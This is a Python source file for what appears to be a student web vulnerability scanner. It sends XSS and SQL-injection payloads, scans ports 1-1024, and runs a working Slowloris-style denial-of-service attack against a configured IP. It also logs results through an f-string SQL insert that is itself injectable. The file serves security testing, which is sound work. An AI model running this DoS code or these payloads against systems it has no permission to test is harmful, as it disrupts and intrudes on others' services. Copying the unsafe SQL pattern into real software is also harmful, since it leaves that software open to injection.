import requests
import socket
import dal_Scanner
from datetime import datetime
import random, time, sys
import configparser
from Cryptographer import Cryptographer

# Gets the site ip by pulling it up from a set txt file
config = configparser.ConfigParser()
config.read(r'Server_Config.txt')
SiteIP = config.get('Config', 'SiteIP')


# Receiving the vulnerability type to scan
# Returning the result of the Scan
def Scan(type):
    connection = dal_Scanner.connect_db()
    if type == 'XSS':
        xss = XSS()
        result = xss.Run_XSS()
    elif type == 'SQL':
        sql = SQLInjection()
        result = sql.Run_SQL_Injection()
    elif type == 'Port':
        port = PortScanner()
        result = port.Run_Port_Scanner()
    elif type == 'DOS':
        dos = DOS(SiteIP, 80, socketsCount=200)
        result = dos.attack(timeout=10 * 1)
    else: # Handeling an unkown test
        result = "Unknown test"

    # Add test result to test Log the database
    sql = f"""INSERT INTO Log VALUES('{datetime.now().strftime("%d/%m/%Y %H:%M:%S")}', '{type}', "{result}", '{SiteIP}')"""
    dal_Scanner.db_change(connection, sql)

    try:
        encrypter = Cryptographer()
        encrypted_result = encrypter.encrypt_message(result)
        return encrypted_result
    except Exception as e:
        print(e)
    return

# Checking if site is secured by differentiating between HTTP and HTTPS
def Check_Security():
    url = "http://"+SiteIP+":80/"
    response = requests.get(url)

    # Check if the site is protected with HTTPS
    if response.status_code == 200 and response.url.startswith("https://"):
        return "The page is secure (HTTPS)"
    else:
        return "The page is not secure (HTTP)"

#XSS Attack class
class XSS:
    def __init__(self):
        self.SiteIP = SiteIP

    # Scanning for XSS vulnerability
    def Run_XSS(self):
        URL = "http://"+self.SiteIP+":80/XSS"
        #Simple java script alert payload
        payloads = ["<script>alert('XSS')</script>"]
        result = "not found"
        # Iterate over the payload list and perform HTTP post on target site
        for payload in payloads:
            response = requests.post(URL, data={"comment":payload})
            # Check response to see injection of script succeeded and return if true
            if "<script>" in response.text:
                result = "found"
                return f"Page Tested: {URL} \n {Check_Security()} \n XSS: {result}! \n Payload: {payload} \n \nHere is a useful site that will teach you how to protect your site from XSS attacks \n https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
        #Return test result indicating attack failed
        return f"Page Tested: {URL} \n {Check_Security()} \n XSS: {result} "

#SQL Injection Class
class SQLInjection:
    def __init__(self):
        self.SiteIP = SiteIP

    # Scanning method for SQL Injection vulnerability
    def Run_SQL_Injection(self):
        URL = "http://"+self.SiteIP+":80/"
        #define list of potential payloads for attack
        payloads = ['" OR 1 = 1 -- -', "AND true", "lala'--", "lala' or '1'='1"]
        result = "not found"
        # Iterate over the payload list and perform HTTP post on target site
        for payload in payloads:
            response = requests.post(URL, data={"username": payload, "password": payload})
            # Check response to see if SQL injection succeeded and return if true
            if "Home" in response.text:
                result = "found"
                return f"Page Tested: {URL} \n {Check_Security()} \n SQL Injection: {result}! \n Payload: {payload} \n \nHere is a useful site that will teach you how to protect your site from SQL Injection \n https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"

        #Return test result indicating attack failed
        return f"Page Tested: {URL} \n {Check_Security()} \n SQL Injection: {result} "


#Port scanning class
class PortScanner:
    def __init__(self):
        self.ip = SiteIP

    # Scanning for open TCP ports
    def Run_Port_Scanner(self):
        target_host = self.ip
        #Define port range to scan - normaly the range to test would be 1-65535
        #For the demo we would check the main 1024 ports
        port_range = range(1, 1025)
        port_list = []
        #iterate over all ports and try to connect
        for port in port_range:
            client_socket = socket.socket(socket.AF_INET)
            # Might need shorter timeout for demo
            client_socket.settimeout(0.01)
            result = client_socket.connect_ex((target_host, port))
            # Add port to open list if connection succeeded
            if result == 0:
                port_list.append(port)
                print(f"Port {port} is open")
            client_socket.close()
        #build result message
        open_ports = f"Scanning target site {target_host} for open ports between 1-1024\n {Check_Security()}\n The open ports are: \n"

        try:
            for openP in port_list:
                open_ports = open_ports+ f"{openP} \n"
        finally:
            # Information about securing ports
            open_ports = open_ports + "Here is a useful site that will teach you how about port security \nhttps://cowbell.insure/blog/port-security-1/"
            return open_ports


# Scanning for DOS vulnerability
class DOS():
    def __init__(self, ip, port=80, socketsCount = 200):
        self._ip = ip
        self._port = port
        #Create a standard HTTP header
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        #Generate socket list with length given in constractor
        self._sockets = [self.newSocket() for _ in range(socketsCount)]

    #Get standard HTTP message with random target address
    # accept HTTp command parameter as input
    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")


    #Create new socket method
    def newSocket(self):
        try:
            #TCP/IP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            # send HTTP GET command with  socket
            s.send(self.getMessage("Get/ ?"))
            for header in self._headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            return s
        except socket.error as se:
            time.sleep(0.5)
            # retry to cretate a new socket on failure
            return self.newSocket()

    # Attack method
    def attack(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        cur_time = time.time()
        response_time = []
        #Run until defined attack time pass
        while(time.time() - t < timeout):
            #Iterate over list of sockets connected to the target site
            for s in self._sockets:
                try:
                    before_time = time.time()
                    i += 1
                    #Send HTTP message to site using the socket
                    s.send(self.getMessage("X-a: "))
                    #Add response time to list
                    response_time.append(time.time() - before_time)

                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))

        # Create a base of response time
        base_response = response_time[0]
        # Iterate over list of response time and see if impact of attack
        for item in response_time:
            if item > 10+ 10* base_response:
                return f"Scanning target site {self._ip} for DOS Vulnerability \n {Check_Security()} \n  DOS Vulnerability found! response time is delayed by {item} \n \nHere is a useful site that will teach you how to protect your site from DOS attacks \n https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#dos-prevention"

        # Return test result indicating attack failed
        return f"Scanning target site {self._ip} for DOS Vulnerability \n {Check_Security()} \n  DOS Vulnerability not found!"

